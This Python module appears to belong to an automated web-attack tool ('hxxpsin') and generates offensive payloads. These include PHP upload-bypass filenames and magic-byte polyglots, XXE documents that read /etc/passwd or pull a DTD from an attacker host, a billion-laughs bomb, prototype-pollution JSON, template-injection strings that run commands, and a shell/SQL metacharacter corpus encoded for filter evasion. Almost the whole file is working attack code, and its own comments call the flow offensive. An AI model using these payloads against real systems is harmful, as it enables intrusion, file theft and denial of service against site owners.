"""
fuzz.py — Binary fuzzing primitives for hxxpsin.

The bytes-domain counterpart to codec.py. Used by upload_probe (file-bypass
attacks), nuclei_gen (bake malformed payloads into templates), and the
solver's deterministic recon for protocol-level edge cases.

Five primitive families:
  - mutate_bytes        — random bit/byte mutation with a labeled output
  - boundary_values     — empty, single-byte, 2^N length variants
  - magic_byte_polyglot — prepend a real file-format header so a payload
                          passes "file-type detection" while still being
                          parsed as the embedded language
  - malformed_*         — JSON/XML/multipart breakages that exercise
                          parser-differential bugs
  - upload_variants     — combine the above into a list of (label, filename,
                          body) tuples ready to POST as an upload form

All public functions return labeled tuples so the caller can attribute hits
in reports. RNG is seeded explicitly so test runs are reproducible.

NOTE: This module is *not* exposed to the LLM solver in v1 — binary blobs
eat the model's context window. Callers feed bytes in and get bytes out;
the solver only sees the codec module via tools.
"""

from __future__ import annotations

import json
import random
from typing import Optional


# ---------------------------------------------------------------------------
# Magic bytes — verified real-file headers. PNG/GIF/JPEG copied from
# upload_probe.py:55-64 (the canonical hxxpsin source); other formats added
# from format specs.
# ---------------------------------------------------------------------------

_PNG_MAGIC = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082"
)
_GIF_MAGIC = b"GIF89a\x01\x00\x01\x00\x00\xff\xff\xff,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
_JPEG_MAGIC = bytes.fromhex(
    "ffd8ffe000104a46494600010101006000600000ffdb004300080606070605080707"
    "07090908090a0d161a151213121e1c1d1d2226231c1f1d1d20262824281b202c2c34"
    "32302937271a213b3b34353a4239413a3735ffd9"
)
_PDF_MAGIC = b"%PDF-1.4\n"
_ZIP_MAGIC = b"PK\x03\x04"
_BMP_MAGIC = b"BM\x46\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00"
_WEBP_MAGIC = b"RIFF\x24\x00\x00\x00WEBPVP8 "


def magic_bytes_table() -> dict[str, bytes]:
    """Return {extension: header_bytes}. Single source of truth for file
    magic across hxxpsin — upload_probe.py will eventually consume this
    instead of its private constants (deferred to a follow-up PR)."""
    return {
        "png":  _PNG_MAGIC,
        "gif":  _GIF_MAGIC,
        "jpeg": _JPEG_MAGIC,
        "jpg":  _JPEG_MAGIC,
        "pdf":  _PDF_MAGIC,
        "zip":  _ZIP_MAGIC,
        "bmp":  _BMP_MAGIC,
        "webp": _WEBP_MAGIC,
    }


# ---------------------------------------------------------------------------
# Mutation
# ---------------------------------------------------------------------------

def mutate_bytes(data: bytes, *, count: int = 8,
                 seed: Optional[int] = None) -> list[tuple[str, bytes]]:
    """Generate `count` mutated variants of `data`. Deterministic when
    `seed` is set. Each tuple is (mutation_label, mutated_bytes).

    Mutation kinds (cycled through to cover the space):
      bit_flip, byte_sub, byte_insert, byte_delete, repeat, truncate_head,
      truncate_tail, prepend_null, append_null
    """
    rng = random.Random(seed)
    out: list[tuple[str, bytes]] = []
    if not data:
        # Nothing useful to mutate from empty input — return boundary cases
        # so the caller still gets `count` distinct probes.
        return [(f"empty_{i}", bytes([rng.randrange(256)]) * (i + 1))
                for i in range(count)]

    kinds = ["bit_flip", "byte_sub", "byte_insert", "byte_delete",
             "repeat", "truncate_head", "truncate_tail",
             "prepend_null", "append_null"]
    seen: set[bytes] = set()

    # Cycle through kinds per-attempt so a duplicate collision (e.g. uniform
    # input making truncate_head == truncate_tail) doesn't stall progress.
    max_attempts = count * 8
    for attempt in range(max_attempts):
        if len(out) >= count:
            break
        kind = kinds[attempt % len(kinds)]
        mutated = _apply_mutation(data, kind, rng)
        if mutated in seen or mutated == data:
            continue
        seen.add(mutated)
        out.append((kind, mutated))
    return out


def _apply_mutation(data: bytes, kind: str, rng: random.Random) -> bytes:
    n = len(data)
    if kind == "bit_flip":
        idx = rng.randrange(n)
        bit = 1 << rng.randrange(8)
        return data[:idx] + bytes([data[idx] ^ bit]) + data[idx + 1:]
    if kind == "byte_sub":
        idx = rng.randrange(n)
        return data[:idx] + bytes([rng.randrange(256)]) + data[idx + 1:]
    if kind == "byte_insert":
        idx = rng.randrange(n + 1)
        return data[:idx] + bytes([rng.randrange(256)]) + data[idx:]
    if kind == "byte_delete":
        if n <= 1:
            return data + bytes([rng.randrange(256)])
        idx = rng.randrange(n)
        return data[:idx] + data[idx + 1:]
    if kind == "repeat":
        idx = rng.randrange(n)
        reps = rng.choice([8, 64, 256])
        return data[:idx] + (bytes([data[idx]]) * reps) + data[idx + 1:]
    if kind == "truncate_head":
        cut = max(1, n // 4)
        return data[cut:]
    if kind == "truncate_tail":
        cut = max(1, n // 4)
        return data[:-cut]
    if kind == "prepend_null":
        return b"\x00" * 4 + data
    if kind == "append_null":
        return data + b"\x00" * 4
    return data


# ---------------------------------------------------------------------------
# Boundary values — length-based edge cases
# ---------------------------------------------------------------------------

def boundary_values(*, seed: bytes = b"A",
                    max_pow: int = 20) -> list[tuple[str, bytes]]:
    """Empty + powers-of-two-length blobs + 2^n ± 1 to catch off-by-ones.
    `max_pow` caps the largest blob at 2^max_pow bytes (default 1 MiB)."""
    out: list[tuple[str, bytes]] = [("empty", b""), ("single", seed[:1] or b"A")]
    for p in range(0, max_pow + 1):
        size = 1 << p
        out.append((f"pow2_{p}", (seed * size)[:size]))
        if p >= 4:
            out.append((f"pow2_minus1_{p}", (seed * (size - 1))[:size - 1]))
            out.append((f"pow2_plus1_{p}",  (seed * (size + 1))[:size + 1]))
    return out


# ---------------------------------------------------------------------------
# Polyglots — embed a payload while keeping a real file header
# ---------------------------------------------------------------------------

def magic_byte_polyglot(target_ext: str, payload: bytes) -> bytes:
    """Return a blob that starts with `target_ext`'s magic bytes and contains
    `payload` verbatim. The result will fool magic-byte-based "file type"
    detectors while still being parsed as the embedded language by anything
    that scans the whole body (PHP, JSP, etc).

    Raises ValueError on unknown extension."""
    table = magic_bytes_table()
    header = table.get(target_ext.lower())
    if header is None:
        raise ValueError(f"unknown extension {target_ext!r}. "
                         f"Known: {', '.join(table)}")
    return header + payload


# ---------------------------------------------------------------------------
# Malformed structured payloads — JSON / XML / multipart
# ---------------------------------------------------------------------------

def malformed_json(seed: str = '{"a":1}') -> list[tuple[str, str]]:
    """Variants of `seed` that parser-differential bugs and lenient parsers
    handle inconsistently. Useful for prototype-pollution, mass-assignment,
    and JSON-smuggling probes."""
    return [
        ("trailing_comma",       seed.replace("}", ",}")),
        ("unterminated",         seed[:-1]),
        ("duplicate_key",        '{"a":1,"a":2}'),
        ("unicode_key",          '{"\\u0061":1}'),
        ("bom_prefix",           "﻿" + seed),
        ("comment_block",        seed.replace("{", "{/*x*/")),
        ("comment_line",         seed.replace("}", "}//x")),
        ("nested_proto",         '{"__proto__":{"polluted":true}}'),
        ("nested_constructor",   '{"constructor":{"prototype":{"polluted":true}}}'),
        ("array_at_root",        "[" + seed + "]"),
        ("nan_value",            seed.replace("1", "NaN")),
        ("infinity_value",       seed.replace("1", "Infinity")),
    ]


def malformed_xml(seed: str = "<a/>") -> list[tuple[str, str]]:
    """XML variants — XXE entry points, oversized entities, and namespace
    confusion. Each returned string is an entire document."""
    return [
        ("xxe_file",
            '<?xml version="1.0"?>'
            '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
            f'<r>&x;</r>'),
        ("xxe_http",
            '<?xml version="1.0"?>'
            '<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:80/">]>'
            f'<r>&x;</r>'),
        ("billion_laughs",
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '<!ENTITY lol "lol">'
            '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            ']><lolz>&lol3;</lolz>'),
        ("parameter_entity",
            '<?xml version="1.0"?>'
            '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker/x.dtd">%p;]>'
            f'<r/>'),
        ("unterminated_tag",     seed.replace("/>", "")),
        ("nested_cdata",         f"<a><![CDATA[{seed}]]></a>"),
        ("ns_confusion",
            f'<a xmlns="http://x" xmlns:x="http://y"><x:a/></a>'),
    ]


_CRLF = "\r\n"


def malformed_multipart(boundary: str = "----X",
                        fields: Optional[dict[str, str]] = None
                        ) -> list[tuple[str, bytes]]:
    """Multipart bodies that exercise parser edge cases — useful for upload
    bypass, request smuggling at multipart boundaries, and WAF evasion.
    Returns labeled (label, body_bytes) tuples."""
    fields = fields or {"file": "<?php echo 'x'; ?>"}
    name = next(iter(fields.keys()))
    content = next(iter(fields.values()))

    base_lines = [
        f"--{boundary}",
        f'Content-Disposition: form-data; name="{name}"; filename="x.php"',
        "Content-Type: application/x-php",
        "",
        content,
        f"--{boundary}--",
        "",
    ]
    base = _CRLF.join(base_lines).encode()

    return [
        ("baseline", base),
        ("missing_final_boundary",
            _CRLF.join(base_lines[:-2] + [""]).encode()),
        ("doubled_crlf",
            base.replace(b"\r\n\r\n", b"\r\n\r\n\r\n")),
        ("missing_content_disposition",
            _CRLF.join([f"--{boundary}", "Content-Type: application/x-php",
                        "", content, f"--{boundary}--", ""]).encode()),
        ("nested_boundary",
            _CRLF.join([f"--{boundary}",
                        f'Content-Disposition: form-data; name="{name}"; filename="x.php"',
                        f"Content-Type: multipart/related; boundary={boundary}",
                        "", content, f"--{boundary}--", ""]).encode()),
        ("lf_only",
            base.replace(b"\r\n", b"\n")),
        ("trailing_garbage",
            base + b"garbage_after_terminator\r\n"),
        ("oversized_filename",
            base.replace(b'filename="x.php"',
                         b'filename="' + b"A" * 4096 + b'.php"')),
    ]


# ---------------------------------------------------------------------------
# Upload variants — the high-level recipe for file-upload bypass
# ---------------------------------------------------------------------------

def upload_variants(filename: str, content: bytes,
                    target_ext: str) -> list[tuple[str, str, bytes]]:
    """Generate file-upload bypass variants. Returns (label, filename, body)
    tuples. Each variant represents a different bypass strategy:

      - double_extension: e.g. shell.png.php (handlers that pick the LAST dot)
      - null_byte_truncation: e.g. shell.php\\x00.png (C-string parsers)
      - polyglot: payload prefixed with magic bytes of target_ext
      - magic_prefix_only: keep .{target_ext} name, embed payload after header
      - case_variant: .PhP / .pHp (case-sensitive extension allowlists)
      - alt_extensions: .phtml / .php5 / .phar (handler aliases)
      - leading_dot: .htaccess-style hidden file
    """
    stem, _dot, ext = filename.rpartition(".")
    if not _dot:
        stem, ext = filename, ""

    table = magic_bytes_table()
    header = table.get(target_ext.lower(), b"")

    variants: list[tuple[str, str, bytes]] = [
        ("double_extension",
            f"{stem}.{target_ext}.{ext or 'php'}", content),
        ("null_byte_truncation",
            f"{filename}\x00.{target_ext}", content),
        ("polyglot",
            f"{stem}.{ext or 'php'}", header + content),
        ("magic_prefix_only",
            f"{stem}.{target_ext}", header + content),
        ("case_variant_upper",
            f"{stem}.{ext.upper() or 'PHP'}", content),
        ("case_variant_mixed",
            f"{stem}.{_mixed_case(ext or 'php')}", content),
        ("alt_extension_phtml",  f"{stem}.phtml", content),
        ("alt_extension_php5",   f"{stem}.php5", content),
        ("alt_extension_phar",   f"{stem}.phar", content),
        ("leading_dot",          f".{filename}", content),
        ("space_suffix",         f"{filename} ", content),
        ("trailing_dot",         f"{filename}.", content),
    ]
    return variants


def _mixed_case(s: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower()
                   for i, c in enumerate(s))


# ---------------------------------------------------------------------------
# Character corpus — strings that reliably surface undefined / parser-
# differential behavior. Pair with codec.variants() via encoded_corpus()
# below to fire the same character through every encoder a sink might
# decode (URL, HTML, base64'd cookie, JSON-escape, etc.) — the flow is
# offensive (decode→mutate→reencode), NOT parser-differential research:
# no encode→decode equality checks here.
# ---------------------------------------------------------------------------

_CHAR_CATEGORIES: dict[str, list[tuple[str, str]]] = {
    # Control bytes (ord < 0x20 or == 0x7f) — boundary, log-injection,
    # header-smuggling, parser-cutoff territory.
    "control": [
        ("null",          "\x00"),
        ("tab",           "\t"),
        ("lf",            "\n"),
        ("cr",            "\r"),
        ("vt",            "\x0b"),
        ("ff",            "\x0c"),
        ("esc",           "\x1b"),
        ("del",           "\x7f"),
        ("sub_eof_dos",   "\x1a"),   # Ctrl-Z — MySQL/DOS EOF
    ],

    # UTF-8 oddities — overlong encodings that decode to ASCII paths
    # only on lenient decoders; surrogate halves rejected by strict UTF-8;
    # BOM that some parsers silently strip and others keep; non-characters.
    "utf8_overlong": [
        ("overlong_slash_2byte", "\xc0\xaf"),     # / via 2-byte overlong
        ("overlong_dot_2byte",   "\xc0\xae"),     # . via 2-byte overlong
        ("overlong_slash_3byte", "\xe0\x80\xaf"),
        ("overlong_dot_3byte",   "\xe0\x80\xae"),
        ("surrogate_high",       "\ud800"),
        ("surrogate_low",        "\udfff"),
        ("bom_utf8",             "﻿"),
        ("non_char_fffe",        "￾"),
        ("non_char_ffff",        "￿"),
    ],

    # Unicode normalization — chars that change identity under NFKC/NFKD.
    # Fullwidth `＜＞＂＇／` collapse to ASCII after NFKC: filters that strip
    # `<>` pre-normalization but render post-normalization will miss them.
    "normalization": [
        ("fullwidth_lt",        "＜"),   # ＜ → <
        ("fullwidth_gt",        "＞"),
        ("fullwidth_quote",     "＂"),
        ("fullwidth_apos",      "＇"),
        ("fullwidth_slash",     "／"),
        ("fullwidth_backslash", "＼"),
        ("ligature_ffi",        "ﬃ"),   # ﬃ → ffi
        ("ligature_fi",         "ﬁ"),
        ("turkish_dotless_i",   "ı"),   # ı → i casefold surprise
        ("turkish_dotted_I",    "İ"),
        ("kelvin_K",            "K"),   # K → k under NFKC
    ],

    # Invisible / direction / zero-width — filename masking, comment-shaped
    # spoofing, parser/visible-form mismatches.
    "invisible": [
        ("zwsp",            "​"),
        ("zwj",             "‍"),
        ("zwnj",            "‌"),
        ("word_joiner",     "⁠"),
        ("rlo",             "‮"),
        ("lro",             "‭"),
        ("rli",             "⁧"),
        ("lri",             "⁦"),
        ("pdi",             "⁩"),
        ("soft_hyphen",     "­"),
        ("nbsp",            " "),
        ("nnbsp",           " "),
        ("ideographic_space", "　"),
        ("mongolian_vs",    "᠎"),
    ],

    # Newline variants — JS pre-ES2019 treated LS/PS as line terminators
    # in string literals; many parsers split on CR but not NEL.
    "newline": [
        ("lf",      "\n"),
        ("cr",      "\r"),
        ("crlf",    "\r\n"),
        ("lfcr",    "\n\r"),
        ("nel",     ""),
        ("ls",      " "),
        ("ps",      " "),
    ],

    "shell_meta": [
        ("backtick",      "`"),
        ("dollar",        "$"),
        ("dollar_parens", "$()"),
        ("dollar_braces", "${IFS}"),
        ("semicolon",     ";"),
        ("pipe",          "|"),
        ("amp",           "&"),
        ("gt_redir",      ">"),
        ("lt_redir",      "<"),
        ("newline_shell", "\n"),
        ("backslash",     "\\"),
    ],

    "sql_meta": [
        ("single_quote",        "'"),
        ("double_quote",        "\""),
        ("comment_dash",        "--"),
        ("comment_block_open",  "/*"),
        ("comment_block_close", "*/"),
        ("comment_hash",        "#"),
        ("backslash",           "\\"),
        ("null_byte",           "\x00"),
        ("mysql_eof",           "\x1a"),
    ],

    "html_meta": [
        ("lt",            "<"),
        ("gt",            ">"),
        ("quote_double",  "\""),
        ("quote_single",  "'"),
        ("amp",           "&"),
        ("backtick",      "`"),
    ],

    "template": [
        ("jinja",        "{{7*7}}"),
        ("ruby_erb",     "<%= 7*7 %>"),
        ("el",           "${7*7}"),
        ("freemarker",   "#{7*7}"),
        ("smarty",       "{$smarty.version}"),
        ("twig",         "{{ 7*'7' }}"),
        ("angular",      "{{constructor.constructor('1')()}}"),
        ("spel",         "T(java.lang.Runtime).getRuntime().exec('id')"),
    ],

    "format_string": [
        ("pct_s",  "%s"),
        ("pct_n",  "%n"),
        ("pct_x",  "%x"),
        ("pct_d",  "%d"),
        ("pct_p",  "%p"),
    ],

    # Numeric oddities — JSON / query-param parsers diverge here.
    "numeric": [
        ("neg_zero",             "-0"),
        ("pos_zero",             "+0"),
        ("hex_one",              "0x1"),
        ("octal_seven",          "0o7"),
        ("leading_zero",         "0123"),
        ("scientific_overflow",  "1e1000"),
        ("scientific_underflow", "1e-1000"),
        ("nan",                  "NaN"),
        ("infinity",             "Infinity"),
        ("neg_infinity",         "-Infinity"),
    ],
}


def character_corpus(category: Optional[str] = None) -> list[tuple[str, str]]:
    """Return [(label, raw_str), …] of characters/strings useful for surfacing
    undefined / parser-differential behavior.

    `category` filters to one of:
        control, utf8_overlong, normalization, invisible, newline,
        shell_meta, sql_meta, html_meta, template, format_string, numeric

    `category=None` returns the union across all categories with labels
    prefixed by category name (e.g., ``"control/null"``) so callers can
    attribute hits in reports."""
    if category is None:
        out: list[tuple[str, str]] = []
        for cat, items in _CHAR_CATEGORIES.items():
            for label, value in items:
                out.append((f"{cat}/{label}", value))
        return out
    if category not in _CHAR_CATEGORIES:
        raise ValueError(
            f"unknown category {category!r}. "
            f"Known: {', '.join(_CHAR_CATEGORIES)}"
        )
    return list(_CHAR_CATEGORIES[category])


def character_categories() -> list[str]:
    """Return the category names available to character_corpus()."""
    return list(_CHAR_CATEGORIES.keys())


def encoded_corpus(
    *,
    categories: Optional[list[str]] = None,
    schemes: Optional[list[str]] = None,
    include_raw: bool = True,
    chain: bool = False,
) -> list[tuple[str, str, str]]:
    """Cross-product `character_corpus × codec.encode` for offensive reach.

    Returns ``[(char_label, scheme_label, value), …]`` — values ready to
    inject at any sink that decodes through `scheme_label` (URL → server,
    HTML → browser, base64'd cookie, JSON-escape, …) without the caller
    having to know which encoder to call.

    Args:
        categories: subset of character_corpus categories (default: all).
        schemes:    codec scheme names (default: codec.variants() default
                    web-filter-bypass set).
        include_raw: include the unencoded value too (label ``"raw"``).
        chain:      pass through to codec.variants(chain=True) for the
                    pre-whitelisted encoding chains.

    Schemes that raise on a particular input are silently skipped — common
    with surrogate halves or invalid UTF-8 against utf7/utf16le. This is
    intentional: the corpus is a tap, not a verification harness."""
    # Lazy import — keeps fuzz.py importable without codec at parse time
    # and avoids the heavier dependency for callers that only want
    # character_corpus().
    import codec  # noqa: WPS433

    if categories:
        chars: list[tuple[str, str]] = []
        for cat in categories:
            chars.extend((f"{cat}/{lbl}", v)
                          for lbl, v in character_corpus(cat))
    else:
        chars = character_corpus()

    out: list[tuple[str, str, str]] = []
    for char_label, value in chars:
        if include_raw:
            out.append((char_label, "raw", value))
        try:
            encoded = codec.variants(value, schemes=schemes, chain=chain)
        except Exception:
            continue
        for scheme_label, encoded_value in encoded:
            out.append((char_label, scheme_label, encoded_value))
    return out


__all__ = [
    "magic_bytes_table",
    "mutate_bytes",
    "boundary_values",
    "magic_byte_polyglot",
    "malformed_json",
    "malformed_xml",
    "malformed_multipart",
    "upload_variants",
    "character_corpus",
    "character_categories",
    "encoded_corpus",
]
